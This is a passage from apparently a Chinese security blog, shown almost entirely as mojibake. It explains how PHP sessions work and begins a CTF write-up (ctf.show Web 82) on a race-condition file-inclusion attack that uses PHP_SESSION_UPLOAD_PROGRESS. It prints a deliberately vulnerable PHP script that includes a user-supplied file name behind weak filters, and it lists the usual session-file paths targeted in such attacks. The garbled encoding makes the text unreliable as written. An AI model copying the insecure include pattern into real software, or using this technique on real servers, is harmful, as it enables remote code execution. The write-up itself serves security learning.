<li><strong>Cookie çš„å±€é™æ€§</strong>ï¼šè™½ç„¶ Cookie å¯ä»¥å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼Œä½†ç›´æ¥å­˜å‚¨æ•æ„Ÿæ•°æ®åœ¨å®¢æˆ·ç«¯ï¼ˆå¦‚ç”¨æˆ·IDï¼‰å­˜åœ¨å®‰å…¨éšæ‚£ï¼Œä¸”å¯èƒ½è¢«ç¯¡æ”¹ã€‚</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå¼€å‘è€…æå‡ºå°†æ•æ„Ÿæ•°æ®å­˜å‚¨åœ¨<strong>æœåŠ¡å™¨ç«¯</strong>ï¼Œå®¢æˆ·ç«¯ä»…ä¿å­˜ä¸€ä¸ªéšæœºç”Ÿæˆçš„ IDï¼ˆSession IDï¼‰ï¼Œé€šè¿‡è¿™ä¸ª ID å…³è”æœåŠ¡å™¨æ•°æ®ï¼Œè§£å†³äº†å®‰å…¨æ€§å’ŒçŠ¶æ€ç®¡ç†é—®é¢˜ã€‚</li>
</ul>
<h2 id="Sessionå·¥ä½œåŸç†æµç¨‹"><a href="#Sessionå·¥ä½œåŸç†æµç¨‹" class="headerlink" title="Sessionå·¥ä½œåŸç†æµç¨‹"></a>Sessionå·¥ä½œåŸç†æµç¨‹</h2><ul>
<li>å®¢æˆ·ç«¯è®¿é—®ç½‘ç«™</li>
<li>æœåŠ¡å™¨åˆ›å»º SessionID </li>
<li>é€šè¿‡ Cookie å‘é€ç»™æµè§ˆå™¨ï¼ˆ Set-Cookie å­—æ®µï¼‰</li>
<li>æµè§ˆå™¨åç»­è¯·æ±‚æºå¸¦ SessionID </li>
<li>æœåŠ¡å™¨åŒ¹é… Session æ•°æ®</li>
<li>è¯»å–&#x2F;ä¿®æ”¹æ•°æ®</li>
</ul>
<h3 id="æµç¨‹è§£æï¼ˆä»¥-PHP-ä¸ºä¾‹ï¼‰"><a href="#æµç¨‹è§£æï¼ˆä»¥-PHP-ä¸ºä¾‹ï¼‰" class="headerlink" title="æµç¨‹è§£æï¼ˆä»¥ PHP ä¸ºä¾‹ï¼‰"></a>æµç¨‹è§£æï¼ˆä»¥ PHP ä¸ºä¾‹ï¼‰</h3><p><strong>ç”¨æˆ·é¦–æ¬¡è®¿é—®</strong></p>
<ol>
<li><strong>è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨</strong>ï¼šç”¨æˆ·è®¿é—®ç½‘ç«™ï¼ˆå¦‚ <code>example.com</code>ï¼‰ã€‚</li>
<li><strong>ç”Ÿæˆ Session ID</strong>ï¼šæœåŠ¡å™¨æ£€æŸ¥è¯·æ±‚ä¸­æ˜¯å¦æºå¸¦ Session IDã€‚å¦‚æœæ˜¯æ–°ç”¨æˆ·ï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ª <strong>å”¯ä¸€ Session ID</strong>ï¼ˆå¦‚ <code>abc123</code>ï¼‰ï¼Œé€šå¸¸é€šè¿‡åŠ å¯†ç®—æ³•ï¼ˆå¦‚ PHP é»˜è®¤ä½¿ç”¨ <code>sha1</code>ï¼‰ç”Ÿæˆã€‚</li>
<li><strong>åˆ›å»ºå­˜å‚¨æ–‡ä»¶</strong>ï¼šæœåŠ¡å™¨åœ¨æŒ‡å®šç›®å½•ï¼ˆå¦‚ <code>/tmp/</code>ï¼‰ç”Ÿæˆæ–‡ä»¶ <code>sess_abc123</code>ï¼ˆæ³¨æ„è¯¥æ–‡ä»¶æ— åç¼€åï¼‰ï¼Œç”¨äºå­˜å‚¨è¯¥ç”¨æˆ·çš„ Session æ•°æ®ï¼ˆå¦‚ç”¨æˆ·åã€è´­ç‰©è½¦å†…å®¹ç­‰ï¼‰ã€‚</li>
<li><strong>è¿”å› Session ID</strong>ï¼šæœåŠ¡å™¨é€šè¿‡ <strong>HTTP å“åº”å¤´</strong> å°† Session ID ä¼ é€’ç»™æµè§ˆå™¨ã€‚é»˜è®¤ä½¿ç”¨ <strong>Cookie</strong>ï¼ˆå¦‚ <code>PHPSESSID=abc123</code>ï¼‰ï¼Œä½†ä¹Ÿå¯é€šè¿‡ URL å‚æ•°ä¼ é€’ï¼ˆä¸æ¨èï¼‰ã€‚</li>
</ol>
<p><strong>ç”¨æˆ·åç»­è¯·æ±‚</strong></p>
<ol>
<li><strong>æºå¸¦ Session ID</strong>ï¼šæµè§ˆå™¨åœ¨åç»­è¯·æ±‚ä¸­è‡ªåŠ¨é€šè¿‡ Cookie å‘é€ Session ID ï¼ˆ<code>PHPSESSID=abc123</code>ï¼‰ã€‚</li>
<li><strong>æœåŠ¡å™¨è¯»å–æ•°æ®</strong>ï¼šæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œé€šè¿‡ Session ID æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶ <code>sess_abc123</code>ï¼Œå¹¶å°†æ–‡ä»¶å†…å®¹ååºåˆ—åŒ–ä¸º <code>$_SESSION</code> æ•°ç»„ã€‚<br>æ³¨ï¼š<strong>åºåˆ—åŒ– (Serialization)<strong>ï¼šæŠŠç¨‹åºä¸­çš„</strong>å¯¹è±¡</strong>ï¼ˆå¦‚å˜é‡ã€æ•°æ®ç»“æ„ï¼‰è½¬æ¢ä¸º<strong>æ ‡å‡†åŒ–æ ¼å¼</strong>ï¼ˆå­—ç¬¦ä¸²&#x2F;äºŒè¿›åˆ¶æµï¼‰ï¼›<strong>ååºåˆ—åŒ– (Deserialization)<strong>ï¼šå°†</strong>æ ‡å‡†åŒ–æ ¼å¼</strong>çš„æ•°æ®é‡æ–°è½¬æ¢ä¸ºç¨‹åºå¯ç”¨çš„<strong>åŸå§‹å¯¹è±¡</strong>ï¼Œæ¢å¤å…¶ç»“æ„å’ŒåŠŸèƒ½ã€‚</li>
<li><strong>æ•°æ®æ›´æ–°ä¸ä¿å­˜</strong>ï¼šPHP è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­ä¿®æ”¹ <code>$_SESSION</code> çš„æ•°æ®ï¼Œè„šæœ¬ç»“æŸæ—¶ï¼ŒæœåŠ¡å™¨å°† <code>$_SESSION</code> çš„æ•°æ®åºåˆ—åŒ–åå†™å›æ–‡ä»¶ã€‚</li>
</ol>
<h2 id="ä¸€äº›ç»†èŠ‚"><a href="#ä¸€äº›ç»†èŠ‚" class="headerlink" title="ä¸€äº›ç»†èŠ‚"></a>ä¸€äº›ç»†èŠ‚</h2><p><strong>Session çš„åˆ›å»º</strong></p>
<p>Session çš„åˆ›å»ºå’Œç®¡ç†æ˜¯ç”±<strong>åç«¯ç¼–ç¨‹è¯­è¨€æˆ–æ¡†æ¶</strong>ï¼ˆåº”ç”¨æœåŠ¡å™¨ï¼‰å®ç°ï¼Œå¦‚ï¼š</p>
<ul>
<li><strong>Tomcat</strong>ï¼šJava Servlet å®¹å™¨ï¼Œè¿è¡Œ Java Web åº”ç”¨ã€‚</li>
<li><strong>uWSGI</strong>ï¼šPython åº”ç”¨æœåŠ¡å™¨ï¼Œé…åˆ Django&#x2F;Flask ä½¿ç”¨ã€‚</li>
<li><strong>Node.js</strong>ï¼šæœ¬èº«ä¸æ˜¯åº”ç”¨æœåŠ¡å™¨ï¼Œä½† Expressã€Koa ç­‰æ¡†æ¶æä¾›ç±»ä¼¼åŠŸèƒ½ã€‚</li>
<li><strong>PHP-FPM</strong>ï¼šä¸“ä¸º PHP è®¾è®¡çš„è¿›ç¨‹ç®¡ç†å™¨ï¼Œä¸ Nginx&#x2F;Apache é…åˆä½¿ç”¨ã€‚</li>
</ul>
<p><strong>æœåŠ¡å™¨ç«¯æ•°æ®å­˜å‚¨</strong></p>
<ul>
<li><strong>é»˜è®¤å­˜å‚¨æ–¹å¼</strong>ï¼šæ–‡ä»¶å­˜å‚¨ï¼ˆæ¯ä¸ª Session ID å¯¹åº”ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ <code>sess_abc123</code>ï¼‰ã€‚</li>
<li><strong>å­˜å‚¨è·¯å¾„</strong>ï¼šé€šè¿‡ <code>php.ini</code> çš„ <code>session.save_path</code> é…ç½®ï¼ˆå¦‚ <code>/tmp/</code>ï¼‰ã€‚</li>
<li><strong>åºåˆ—åŒ–æ ¼å¼</strong>ï¼šæ•°æ®ä»¥é”®å€¼å¯¹å½¢å¼åºåˆ—åŒ–å­˜å‚¨ï¼ˆå¦‚ <code>username|s:4:&quot;Lucy&quot;;</code>ï¼‰ã€‚</li>
<li><strong>å…¶ä»–å­˜å‚¨æ–¹å¼</strong>ï¼šå¯è‡ªå®šä¹‰å­˜å‚¨åˆ°æ•°æ®åº“ã€Redis ç­‰ã€‚</li>
</ul>
<p><strong>Session çš„ç”Ÿå‘½å‘¨æœŸ</strong></p>
<p>Session æ•°æ®åœ¨ä¼šè¯æœŸé—´ï¼ˆæŒç»­æ“ä½œ Session æ—¶ï¼‰æŒç»­æœ‰æ•ˆï¼Œä¹Ÿå¯é€šè¿‡ <code>session_destroy()</code> æˆ–é…ç½®çš„è¿‡æœŸæ—¶é—´ï¼ˆ <code>php.ini</code> ä¸­çš„ <code>session.gc_maxlifetime</code> é…ç½®é¡¹ï¼‰è‡ªåŠ¨æ¸…ç†ã€‚è‹¥ç”¨æˆ·åœ¨ä¸€å®šæ—¶é—´å†…æ²¡æœ‰å¯¹æœåŠ¡å™¨è¿›è¡Œä»»ä½•ä¸è¯¥ Session ç›¸å…³çš„æ“ä½œï¼ˆå¦‚å…³é—­æµè§ˆå™¨ï¼‰ï¼ŒæœåŠ¡å™¨å°±ä¼šè®¤ä¸ºä¼šè¯å·²ç»“æŸï¼Œä»è€Œä½¿ Session å¤±æ•ˆã€‚<br>æœ‰äº›åº”ç”¨å¯èƒ½ä¼šé‡‡ç”¨æŒä¹…åŒ– Session çš„æ–¹å¼ï¼Œå°† Session æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“æˆ–å…¶ä»–æŒä¹…åŒ–å­˜å‚¨ä»‹è´¨ä¸­ã€‚è¿™æ ·å³ä½¿å…³é—­æµè§ˆå™¨ï¼Œä¸‹æ¬¡æ‰“å¼€æµè§ˆå™¨è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œåªè¦åœ¨ä¸€å®šçš„æœ‰æ•ˆæœŸå†…ï¼Œä»ç„¶å¯ä»¥æ¢å¤ä¹‹å‰çš„ Session çŠ¶æ€ã€‚ï¼ˆâ€œè®°ä½æˆ‘â€åŠŸèƒ½ï¼‰</p>
<h2 id="PHP-ä¸­çš„-Session"><a href="#PHP-ä¸­çš„-Session" class="headerlink" title="PHP ä¸­çš„ Session"></a>PHP ä¸­çš„ Session</h2><h3 id="SESSION-æ•°ç»„"><a href="#SESSION-æ•°ç»„" class="headerlink" title="$_SESSION æ•°ç»„"></a><code>$_SESSION</code> æ•°ç»„</h3><p>ä¸å…¶ä»–è¶…å…¨å±€å˜é‡ï¼ˆå¦‚ <code>$_GET</code>ã€<code>$_POST</code>ã€<code>$_COOKIE</code>ï¼‰ä¸åŒï¼Œ<code>$_SESSION</code> çš„å†…å®¹å¹¶éç›´æ¥æ¥è‡ªå®¢æˆ·ç«¯çš„è¾“å…¥ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨<strong>æœåŠ¡å™¨ç«¯</strong>ã€‚</p>
<p>å½“ç”¨æˆ·é¦–æ¬¡è®¿é—®æ—¶ï¼ŒPHP ä¼šç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ <code>Session ID</code>ï¼Œå¹¶å‘é€åˆ°å®¢æˆ·ç«¯ã€‚åç»­è¯·æ±‚ä¸­ï¼Œå®¢æˆ·ç«¯æºå¸¦ <code>Session ID</code>ï¼ˆå¦‚é€šè¿‡ Cookie æˆ– URLï¼‰ï¼ŒæœåŠ¡å™¨æ ¹æ®è¯¥ ID æ‰¾åˆ°å¯¹åº”çš„ Session æ•°æ®å¹¶åŠ è½½åˆ° <code>$_SESSION</code> æ•°ç»„ä¸­ã€‚</p>
<h3 id="Session-å·¥ä½œæµç¨‹"><a href="#Session-å·¥ä½œæµç¨‹" class="headerlink" title="Session å·¥ä½œæµç¨‹"></a>Session å·¥ä½œæµç¨‹</h3><p><strong>åˆå§‹åŒ–ä¼šè¯</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">// å¼€å¯ä¼šè¯ï¼Œè¯»å–æˆ–åˆ›å»º Session ID</span></span><br></pre></td></tr></table></figure>

<p>å½“è°ƒç”¨ <code>session_start()</code> æ—¶ï¼ŒPHP ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p>
<ul>
<li><strong>æ£€æŸ¥å®¢æˆ·ç«¯æ˜¯å¦æºå¸¦æœ‰æ•ˆçš„ Session ID</strong>ï¼š<ul>
<li>å¦‚æœå®¢æˆ·ç«¯é€šè¿‡ Cookie æˆ– URL ä¼ é€’äº†æœ‰æ•ˆçš„ Session IDï¼ˆ Cookie ä¸­é»˜è®¤ä¸º <code>PHPSESSID</code>ï¼‰ï¼ŒPHP ä¼šå°è¯•è¯»å–å¯¹åº”çš„ Session æ–‡ä»¶ã€‚</li>
<li>å¦‚æœæœªæ‰¾åˆ°æœ‰æ•ˆçš„ Session IDï¼ŒPHP ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ Session IDï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ Session æ–‡ä»¶ï¼ˆé€šå¸¸ä¸ºç©ºæ–‡ä»¶ï¼Œè·¯å¾„ç”± <code>session.save_path</code> é…ç½®å†³å®šï¼‰ã€‚æ–°çš„ Session ID ä¼šé€šè¿‡ HTTP å“åº”å¤´ï¼ˆ Cookie æˆ– URL ï¼‰å°† Session ID ä¼ é€’ç»™æµè§ˆå™¨ã€‚</li>
</ul>
</li>
<li>**åŠ è½½æ•°æ®åˆ° <code>$_SESSION</code>**ï¼š<ul>
<li>å¦‚æœ Session æ–‡ä»¶ä¸­æœ‰æ•°æ®ï¼ŒPHP ä¼šå°†å…¶ååºåˆ—åŒ–å¹¶åŠ è½½åˆ° <code>$_SESSION</code> æ•°ç»„ä¸­ã€‚</li>
<li>å¦‚æœæ˜¯ä¸€ä¸ªæ–°ä¼šè¯ï¼Œ<code>$_SESSION</code> æ•°ç»„åˆå§‹åŒ–ä¸ºç©ºã€‚</li>
</ul>
</li>
</ul>
<p><strong>æ“ä½œ Session æ•°æ®</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;Alice&#x27;</span>; <span class="comment">// å†™å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];      <span class="comment">// è¯»å–æ•°æ®</span></span><br></pre></td></tr></table></figure>

<ul>
<li>**ä¿®æ”¹ <code>$_SESSION</code>**ï¼š<ul>
<li>å¼€å‘è€…å¯ä»¥åœ¨è„šæœ¬ä¸­ç›´æ¥æ“ä½œ <code>$_SESSION</code> æ•°ç»„ï¼ˆå¦‚ <code>$_SESSION[&#39;key&#39;] = &#39;value&#39;</code>ï¼‰ã€‚</li>
<li>æ­¤æ—¶æ‰€æœ‰ä¿®æ”¹ä»…ä¿å­˜åœ¨å†…å­˜ä¸­çš„ <code>$_SESSION</code> æ•°ç»„é‡Œï¼Œ<strong>å°šæœªå†™å…¥ Session æ–‡ä»¶</strong>ã€‚</li>
</ul>
</li>
<li><strong>è‡ªåŠ¨æäº¤</strong>ï¼š<ul>
<li>PHP ä¼šåœ¨è„šæœ¬æ‰§è¡Œç»“æŸæ—¶ï¼ˆæˆ–è°ƒç”¨ <code>session_write_close()</code> æ—¶ï¼‰ï¼Œå°† <code>$_SESSION</code> æ•°ç»„çš„å†…å®¹åºåˆ—åŒ–ï¼Œå¹¶å†™å…¥åˆ° Session æ–‡ä»¶ä¸­ã€‚ï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼ŒSession æ–‡ä»¶ä¼šè¢«åŠ é”ã€‚å¦‚æœè„šæœ¬æ‰§è¡Œæ—¶é—´è¿‡é•¿ï¼Œå…¶ä»–è¯·æ±‚è®¿é—®åŒä¸€ Session ä¼šè¢«é˜»å¡ã€‚å¯é€šè¿‡ <code>session_write_close()</code> æå‰é‡Šæ”¾é”ã€‚ï¼‰</li>
<li>å†™å…¥å®Œæˆåï¼ŒSession æ–‡ä»¶ä¼šæ›´æ–°ä¸ºæœ€æ–°çš„æ•°æ®ã€‚</li>
</ul>
</li>
</ul>
<p>**é”€æ¯ Session **</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_destroy</span>(); <span class="comment">// åˆ é™¤æœåŠ¡å™¨ç«¯ Session æ•°æ®</span></span><br></pre></td></tr></table></figure>

<p>å¯é€šè¿‡ <code>session_destroy()</code> æˆ–é…ç½®çš„è¿‡æœŸæ—¶é—´ï¼ˆ <code>session.gc_maxlifetime</code> é…ç½®é¡¹ï¼‰æ¥é”€æ¯ Session ã€‚</p>
<p><strong>PHP Session æ–‡ä»¶çš„å‚¨å­˜è·¯å¾„</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>



<h3 id="Session-çš„å¸¸ç”¨é…ç½®é¡¹"><a href="#Session-çš„å¸¸ç”¨é…ç½®é¡¹" class="headerlink" title="Session çš„å¸¸ç”¨é…ç½®é¡¹"></a>Session çš„å¸¸ç”¨é…ç½®é¡¹</h3><ul>
<li><code>session.save_path</code>ï¼šSessionæ–‡ä»¶å­˜å‚¨è·¯å¾„ï¼ˆé»˜è®¤ <code>/tmp</code>ï¼‰ã€‚</li>
<li><code>session.name</code>ï¼šSession Cookieçš„åç§°ï¼ˆé»˜è®¤ <code>PHPSESSID</code>ï¼‰ã€‚</li>
<li><code>session.cookie_lifetime</code>ï¼šSession IDçš„å­˜æ´»æ—¶é—´ï¼ˆç§’ï¼Œ0è¡¨ç¤ºæµè§ˆå™¨å…³é—­åå¤±æ•ˆï¼‰ã€‚</li>
<li><code>session.gc_maxlifetime</code>ï¼šSessionæ•°æ®è¿‡æœŸæ—¶é—´ï¼ˆé»˜è®¤1440ç§’ï¼Œ24åˆ†é’Ÿï¼‰ã€‚</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cm9wms3la000bkcuhg2cp17lh" data-title="Session" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">æ‚é¡¹çŸ¥è¯†ç‚¹</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-æ¡ä»¶ç«äº‰æ¼æ´" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2025-04-19T10:35:19.000Z" itemprop="datePublished">2025-04-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">å‘½ä»¤æ‰§è¡Œä¸æ–‡ä»¶åŒ…å«</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/">æ¡ä»¶ç«äº‰æ¼æ´ä¸ Session çš„æ–‡ä»¶ä¸Šä¼ è¿›åº¦è¿½è¸ªåŠŸèƒ½</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>ctf.show Web 82</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€é“æ¼«é•¿çš„é¢˜ç›®ï¼Œåœ¨è§£é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€äº›ä¸œè¥¿ï¼š</p>
<h2 id="æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸å®ä¾‹"><a href="#æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸å®ä¾‹" class="headerlink" title="æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸å®ä¾‹"></a>æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸å®ä¾‹</h2><p><strong>æŠ€æœ¯åŸç†</strong>ï¼šåœ¨ç¨‹åºè¿è¡Œä¸­ï¼Œå¼€å‘è€…ä¸€èˆ¬å¸Œæœ›ä»£ç æŒ‰é¡ºåºä¸€æ¡ä¸€æ¡æ‰§è¡Œã€‚ä½†åœ¨å¤šçº¿ç¨‹æˆ–å¤šè¿›ç¨‹çš„ç¯å¢ƒä¸‹ï¼ŒæœåŠ¡å™¨ä¼šå¹¶å‘å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚å¦‚æœæ²¡æœ‰ä½¿ç”¨åˆé€‚çš„åŒæ­¥æœºåˆ¶ï¼ˆåƒé”ï¼Œå®ƒèƒ½ä¿è¯åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è®¿é—®æŸä¸ªèµ„æº ï¼‰ï¼Œè¿™äº›å¹¶å‘çš„çº¿ç¨‹å°±å¯èƒ½åŒæ—¶æ“ä½œå…±äº«èµ„æºï¼Œå¯¼è‡´ç»“æœä¸å¯é¢„æµ‹ã€‚æ¯”å¦‚ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è¯»å–ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œç„¶åéƒ½å¯¹è¿™ä¸ªå€¼è¿›è¡Œä¿®æ”¹å†å†™å›å»ï¼Œæœ€åä¿å­˜çš„å€¼å¯èƒ½ä¸æ˜¯é¢„æœŸçš„ï¼Œå› ä¸ºå®ƒä»¬äº’ç›¸å¹²æ‰°äº†ã€‚</p>
<p><strong>ä»¥æ–‡ä»¶ä¸Šä¼ ä¸ºä¾‹</strong>ï¼š æœ‰äº›ç½‘ç«™å…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šå…ˆæ£€æŸ¥æ–‡ä»¶æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼ˆæ¯”å¦‚åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ ¼å¼æ–‡ä»¶ ï¼‰ï¼Œå¦‚æœä¸ç¬¦åˆå°±åˆ é™¤ã€‚åœ¨æ£€æŸ¥å’Œåˆ é™¤ä¹‹é—´æœ‰ä¸ªæ—¶é—´å·®ï¼Œè¿™å°±æ˜¯ â€œç«äº‰çª—å£â€ ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œå¿«é€Ÿå¤šæ¬¡å‘é€ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼ˆæ¯”å¦‚åŒ…å«æ¶æ„ä»£ç çš„ PHP æ–‡ä»¶ ï¼‰çš„è¯·æ±‚ã€‚å› ä¸ºæœåŠ¡å™¨åœ¨åŒä¸€æ—¶åˆ»å¯èƒ½å¤„ç†ä¸è¿‡æ¥è¿™ä¹ˆå¤šè¯·æ±‚ï¼Œåœ¨è¿˜æ²¡æ¥å¾—åŠåˆ é™¤ä¸ç¬¦åˆè¦æ±‚çš„æ–‡ä»¶æ—¶ï¼Œæ”»å‡»è€…å°±å¯èƒ½æˆåŠŸè®¿é—®åˆ°è¿™ä¸ªæ¶æ„æ–‡ä»¶å¹¶è®©å®ƒæ‰§è¡Œï¼Œè¿›è€Œåœ¨æœåŠ¡å™¨ä¸Šæ¤å…¥åé—¨ï¼Œè·å–å¯¹æœåŠ¡å™¨çš„æ§åˆ¶ã€‚<strong>ç±»ä¼¼äºDDOSæ”»å‡»</strong>,å½“è¯·æ±‚å‘é€å¾—å¤ªå¤šï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šæ¼æ‰ä¸€äº›æ¶æ„æ–‡ä»¶çš„ä¸Šä¼ è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æ¶æ„æ–‡ä»¶è¢«å‘é€åœ¨æœåŠ¡å™¨ä¸­é€ æˆåé—¨æ¼æ´ã€‚<br>ï¼ˆä»¥ä¸Šä¸¤æ®µæ‘˜è‡ª<a target="_blank" rel="noopener" href="http://www.th-dedsec.topã€Šæ¡ä»¶ç«äº‰æ¼æ´ã€‹2025.04.07)/">www.th-dedsec.topã€Šæ¡ä»¶ç«äº‰æ¼æ´ã€‹2025.04.07ï¼‰</a></p>
<h2 id="PHP-SESSION-UPLOAD-PROGRESS-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#PHP-SESSION-UPLOAD-PROGRESS-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESS æ˜¯ä»€ä¹ˆï¼Ÿ"></a><code>PHP_SESSION_UPLOAD_PROGRESS</code> æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p><code>PHP_SESSION_UPLOAD_PROGRESS</code> æ˜¯ PHP æä¾›çš„ä¸€ä¸ªæœºåˆ¶ï¼Œç”¨äº<strong>å®æ—¶è·Ÿè¸ªæ–‡ä»¶ä¸Šä¼ çš„è¿›åº¦</strong>ã€‚æ¯”å¦‚ä¸Šä¼ ä¸€ä¸ªå¤§æ–‡ä»¶æ—¶ï¼Œä½ å¯ä»¥ç”¨å®ƒè·å–å½“å‰ä¸Šä¼ çš„ç™¾åˆ†æ¯”ã€é€Ÿåº¦ã€å‰©ä½™æ—¶é—´ç­‰ä¿¡æ¯ã€‚</p>
<p><strong>å·¥ä½œåŸç†</strong></p>
<ul>
<li>å½“ <code>session.upload_progress.enabled</code> é…ç½®é¡¹å¼€å¯æ—¶ï¼ŒPHP è„šæœ¬åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¸€æ—¦æ£€æµ‹åˆ°è¡¨å•é‡Œå­˜åœ¨ <code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code> çš„å­—æ®µï¼Œå°±ä¼šå¼€å¯æ–‡ä»¶ä¸Šä¼ è¿›åº¦è·Ÿè¸ªåŠŸèƒ½ã€‚</li>
<li>æ­¤æ—¶ï¼Œå½“ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼ŒPHP ä¼šåœ¨<strong>ä¼šè¯ï¼ˆSessionï¼‰</strong>ä¸­ç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œè®°å½•è¯¥è„šæœ¬é‡Œæ‰€æœ‰æ–‡ä»¶ä¸Šä¼ æ“ä½œçš„æ•°æ®ï¼ˆè§ä¸‹æ–¹æ¼”ç¤ºè¿›åº¦ä¿¡æ¯çš„æ•°ç»„ï¼‰ã€‚</li>
